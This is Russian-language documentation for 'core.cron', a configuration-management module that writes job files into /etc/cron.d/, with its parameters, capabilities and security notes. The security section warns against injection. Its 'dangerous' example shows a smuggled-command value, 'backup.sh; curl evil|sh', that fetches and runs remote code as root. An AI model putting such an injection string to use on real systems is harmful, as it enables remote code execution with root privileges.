# core.cron

Управление cron-задачами через системный каталог `/etc/cron.d/`. **Soul-side**,
статически встроен в `soul`-бинарь. Реализация —
[`soul/internal/coremod/cron/cron.go`](../../../../soul/internal/coremod/cron/cron.go).

MVP покрывает **только** system-level задачи (одно правило на файл
`/etc/cron.d/<name>`). User-crontab (`crontab -u user`) сознательно отложен до
реального запроса. Платформенно модуль рассчитан на Linux-дистрибутивы, чей
cron-daemon читает `/etc/cron.d/`; на системах без этого каталога (например
FreeBSD) применять его нельзя — это контролируется `where:`-предикатом в
scenario, а не самим модулем.

## States

| State | Назначение | Идемпотентность (когда `changed=true`) |
|---|---|---|
| `present` | Job-файл `/etc/cron.d/<name>` существует с заданным расписанием и командой. | `changed=true`, если файла не было либо его содержимое отличается от целевой строки `<schedule> <user> <command>` (побайтовая сверка). Совпало — `changed=false`. |
| `absent` | Job-файл удалён. | `changed=true`, если файл был и удалён. Файла нет — `changed=false`. |

## present — params

| Param | Тип | Required / default | Смысл |
|---|---|---|---|
| `name` | string | required | Имя job-а = имя файла в `/etc/cron.d/`. Допустимы только символы `[A-Za-z0-9_-]` — иначе шаг падает (cron-daemon игнорирует файлы с точками/спецсимволами, плюс защита от path-injection). |
| `schedule` | string | required | Cron-расписание (`*/5 * * * *`). Подставляется в строку as-is, без валидации синтаксиса расписания. |
| `command` | string | required | Команда для выполнения. Кладётся в строку as-is. |
| `user` | string | optional (default `root`) | Пользователь, от чьего имени cron запускает команду (5-е поле формата `/etc/cron.d`). |

Итоговое содержимое файла — одна строка `<schedule> <user> <command>\n`.

## absent — params

| Param | Тип | Required / default | Смысл |
|---|---|---|---|
| `name` | string | required | Имя удаляемого job-а (того же ограничения `[A-Za-z0-9_-]`). |

## Capabilities / side-effects

- **Пишет вне `/var/lib/soul-stack`** (`fs_write_root`): создаёт /
  перезаписывает / удаляет файл в `/etc/cron.d/`. Системный путь требует записи в
  `/etc/` — на практике `run_as_root`.
- **Создаёт каталог** `/etc/cron.d` при необходимости (на minimal-контейнерах
  его может не быть).
- **Не выполняет подпроцессов:** запись файла — in-process, без shell. Сам cron
  подхватывает изменения в `/etc/cron.d/` автоматически (reload daemon-а не
  требуется).
- Файл пишется с mode `0644` (cron строго требует, чтобы файл в `/etc/cron.d/`
  не был group/world-writable). Owner не правится — прод-Soul бежит из-под root.

## Output / register

`present` отдаёт `{ name, path, installed: true }`; `absent` —
`{ name, path, installed: false }`. `path` — полный путь к job-файлу
(`/etc/cron.d/<name>`).

## Пример

```yaml
- name: Schedule nightly log rotation
  module: core.cron.present
  params:
    name: soul-log-rotate
    schedule: "0 3 * * *"
    command: "/usr/local/bin/rotate-logs.sh"
    user: root
```

(минимальный валидный пример — в `examples/` задач для `core.cron` пока нет)

## Безопасность

- **`command` исполняется cron-демоном по расписанию от имени `user` — главный
  инвариант модуля.** `schedule`, `user` и `command` подставляются в строку файла
  `/etc/cron.d/<name>` **как есть, без валидации синтаксиса и без escape**
  (`content := fmt.Sprintf("%s %s %s\n", schedule, cronUser, command)`,
  [`applyPresent`](../../../../soul/internal/coremod/cron/cron.go)). `command` —
  это shell-строка, которую cron выполняет; недоверенная интерполяция в `command`
  = отложенное выполнение чужого кода под `user` (по умолчанию **root**, 5-е поле
  `/etc/cron.d`). Источник `command`/`schedule`/`user` должен быть автором
  Destiny/scenario, а не внешним вводом. Дополнительный риск конкретно для cron:
  значение с `\n` в `command` или `schedule` впишет в файл **лишние cron-строки**
  (синтаксис не парсится модулем) — ещё один вектор инъекции через недоверенный
  ввод.
- **Имя job валидируется, остальные поля — нет.** `name` ограничен
  `[A-Za-z0-9_-]` ([`validCronName`](../../../../soul/internal/coremod/cron/cron.go)):
  это и совместимость с run-parts, и **guard от path-injection** (точка/слэш/`..`
  в имени отвергаются до записи). На `schedule`/`command`/`user` такой проверки
  нет — модуль доверяет автору задачи.
- **Опасно vs. правильно.** Подстановка недоверенного значения в `command`:

  ```yaml
  # ОПАСНО: command из внешнего ввода исполнится cron-ом под root.
  # value = "backup.sh; curl evil|sh" → cron выполнит и вторую команду.
  - name: Schedule user-supplied job
    module: core.cron.present
    params:
      name: user-job
      schedule: "0 * * * *"
      command: "${ input.user_command }"
  ```

  ```yaml
  # БЕЗОПАСНО: command — фиксированный путь к доверенному скрипту, под выделенным
  # пользователем (минимизация привилегий), а не root.
  - name: Schedule nightly backup
    module: core.cron.present
    params:
      name: nightly-backup
      schedule: "0 3 * * *"
      command: "/usr/local/bin/backup.sh"
      user: backup
  ```

- **Привилегии.** Манифест
  [`cron.yaml`](../../../../shared/coremanifest/cron.yaml) объявляет
  `required_capabilities: [run_as_root, fs_write_root]` — запись в `/etc/cron.d/`
  идёт за пределами `/var/lib/soul-stack` и требует UID 0; `exec_subprocess`
  **не** объявлен намеренно — модуль внешних бинарей не запускает, файл пишется
  in-process (`os.WriteFile`/`os.Remove`), а cron подхватывает изменения сам. Это
  **декларация** для статической сверки `soul-lint` с `allowed_capabilities`
  хоста (см. [docs/keeper/plugins.md →
  required_capabilities](../../../keeper/plugins.md#required_capabilities-таблица)),
  а **не** runtime-повышение прав: запись идёт с привилегиями процесса
  `soul`-агента (под root), повышения прав внутри модуля нет. Файл пишется с mode
  `0644` (cron строго требует, чтобы файл в `/etc/cron.d/` не был
  group/world-writable); owner модуль не правит — расчёт на то, что прод-Soul
  бежит из-под root и создаёт файл от root.

## См. также

- [README.md](../../README.md) — каталог core-модулей.
- [soul/modules.md](../../../soul/modules.md) — хостовая сторона модулей и кеш.
- [naming-rules.md → Модули Destiny](../../../naming-rules.md#модули-destiny) — словарь имён.
- [ADR-015](../../../adr/0015-core-modules-mvp.md#adr-015-core-модули-mvp-точный-список) — список core MVP.
